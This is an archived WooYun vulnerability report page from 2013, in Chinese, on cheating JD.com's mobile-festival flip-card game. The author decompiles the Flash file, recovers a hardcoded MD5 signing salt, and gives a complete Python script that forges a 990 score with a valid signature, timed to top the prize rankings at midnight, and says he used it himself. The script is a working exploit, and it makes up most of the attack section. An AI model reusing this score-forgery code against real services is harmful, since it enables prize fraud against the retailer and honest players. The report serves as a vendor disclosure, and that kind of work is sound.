@@ -1,0 +1,273 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		京东手机节幸运大翻转刷分（flash逆向分析）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		京东手机节幸运大翻转刷分（flash逆向分析）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/cnrstar">cnrstar</a> 
+</li><li>提交时间：		2013-11-29 10:32</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-29：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-12-02：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-12-12：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-12-22：	细节向普通白帽子公开<br/>
+									2014-01-01：	细节向实习白帽子公开<br/>
+									2014-01-13：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">京东的手机节有个幸运大翻转，玩游戏排名，每天第一MX2，总分第一诺基亚1520，貌似还是很不错的，但是每次排名的那些人都是990，表示手累断了也拿不到990分。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">活动地址：http://sale.jd.com/act/rSR4ExMjOnyGwWmf.html?erpad_source=erpad<br />
+<br />
+<br />
+<br />
+游戏的flash地址：http://mday.jd.com/play/fanpai.swf<br />
+<br />
+游戏点击开始的数据包：<br />
+<br />
+</p><p class="detail"><a href="../images/29001242a7bd278a9c57fa6a24b6f4867cce218b.jpg" target="_blank"><img src="../images/29001242a7bd278a9c57fa6a24b6f4867cce218b.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+游戏结束时的数据包“<br />
+<br />
+</p><p class="detail"><a href="../images/29001424f04f1d709207fa47540eedd4fd0beb15.jpg" target="_blank"><img src="../images/29001424f04f1d709207fa47540eedd4fd0beb15.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+结束时的数据包里有我们的得分，直接修改这个参数会被警告，提示非法。<br />
+<br />
+<br />
+<br />
+猜测后面的sign是一个合法性验证参数，很明显是32位的MD5 hash<br />
+<br />
+现在刷分的关键就在于如何让我们的这个sign合法，由于这个游戏是swf，而且是本地玩的，那就说明这个sign在swf里有设定，然后服务端去验证这个sign是否合法。<br />
+<br />
+<br />
+<br />
+逆一下这个swf后得到源码，搜索到如下sign的定义：<br />
+<br />
+</p><p class="detail"><a href="../images/29001843252da741ce4ec534a36e96698555193e.jpg" target="_blank"><img src="../images/29001843252da741ce4ec534a36e96698555193e.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+同样的可以得到刚开始玩游戏的sign算法，至此，我们只需伪造分数，然后伪造这个sign，就可以完成刷分了。<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">Python代码：<br />
+<br />
+</p><pre><code>#-------------------------------------------------------------------------------<br />
+# Name:<br />
+# Purpose:<br />
+#<br />
+# Author:      Rstar<br />
+#<br />
+# Created:     26/11/2013<br />
+# Copyright:   (c) Rstar 2013<br />
+# Licence:     &lt;your licence&gt;<br />
+#-------------------------------------------------------------------------------<br />
+import urllib2,httplib,md5,time,re<br />
+<br />
+cookie = &#039;xxx&#039; # Your Cookie<br />
+user = &#039;ssss&#039;	# your username<br />
+def getmd5(string):<br />
+    result = md5.new(string)<br />
+    return result.hexdigest()<br />
+<br />
+def gettimestamp():<br />
+    return time.strftime(&#039;%Y%m%d%H%M%S&#039;,time.localtime(time.time()))<br />
+<br />
+def getkey1(timestamp):<br />
+    cmd = &quot;10004&quot;<br />
+    linkworld = ((((((((&quot;cmd&quot; + cmd) + &quot;timestamp&quot;) + timestamp) + &quot;userId&quot;) + user) + &quot;ver&quot;) + &quot;1.0&quot;) + &quot;b14bda484ea4583&quot;);<br />
+    return getmd5(linkworld)<br />
+<br />
+def getkey2(name,score,timestamp):<br />
+    cmd = &quot;10001&quot;<br />
+    sign = ((((((((((((&quot;cmd&quot; + cmd) + &quot;name&quot;) + name) + &quot;score&quot;) + score) + &quot;timestamp&quot;) + timestamp) + &quot;userId&quot;) + user) + &quot;ver&quot;) + &quot;1.0&quot;) +&quot;b14bda484ea4583&quot;);<br />
+    return getmd5(sign)<br />
+<br />
+def httpreq1(url):<br />
+<br />
+    req = urllib2.Request(url)<br />
+    req.add_header(&#039;User-Agent&#039;,&#039;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1685.0 Safari/537.36&#039;)<br />
+    req.add_header(&#039;Referer&#039;,&#039;http://mday.jd.com/index.action&#039;)<br />
+    req.add_header(&#039;Cookie&#039;,cookie)<br />
+<br />
+    #opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(ckjar) )<br />
+    #f = opener.open(req)<br />
+    f = urllib2.urlopen(req)<br />
+    htm = f.read()<br />
+    return htm<br />
+    f.close()<br />
+def main():<br />
+    score = &quot;990&quot;<br />
+    timestamp = gettimestamp()<br />
+    while True:<br />
+        if timestamp == &quot;20131127235824&quot;:<br />
+<br />
+            url1 = &quot;http://mday.jd.com/gw/userService.action?timestamp=&quot;+timestamp+&quot;&amp;cmd=10004&amp;ver=1.0&amp;userId=&quot;+user+&quot;&amp;sign=&quot;+getkey1(timestamp)<br />
+            print url1<br />
+            html1 = httpreq1(url1)<br />
+            print html1<br />
+            re_name = re.compile(&quot;&lt;name&gt;(.+?)&lt;/name&quot;)<br />
+            name = re_name.findall(html1)[0]<br />
+            print &quot;Got Name:&quot;+name+&quot;\tNow Sleep 90s&quot;<br />
+            url2 = &quot;http://mday.jd.com/gw/userService.action?timestamp=&quot;+timestamp+&quot;&amp;cmd=10001&amp;ver=1.0&amp;sign=&quot;+getkey2(name,score,timestamp)+&quot;&amp;score=&quot;+score+&quot;&amp;userId=&quot;+user+&quot;&amp;name=&quot;+name<br />
+            print url2<br />
+            print httpreq1(url2)<br />
+        else:<br />
+            time.sleep(0.2)<br />
+            timestamp = gettimestamp()<br />
+<br />
+if __name__ == &#039;__main__&#039;:<br />
+    main()</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+上面是定点刷，算好秒后，保证在晚上24：00达到最高分，然后去领奖 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你们懂的<br />
+<br />
+不过你们发奖品是怎么发的？那么多人都在刷分，怎么排名的，为啥最高都是990，不能是其他的分？我弄了两次发现没我啥事，球解答。<br />
+<br />
+ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/cnrstar" title="cnrstar">cnrstar</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-044366" title="京东手机节幸运大翻转刷分（flash逆向分析）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：6 </p>
+													<p class="detail">确认时间：2013-12-02 12:10</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢您对京东的关注！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="44366";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
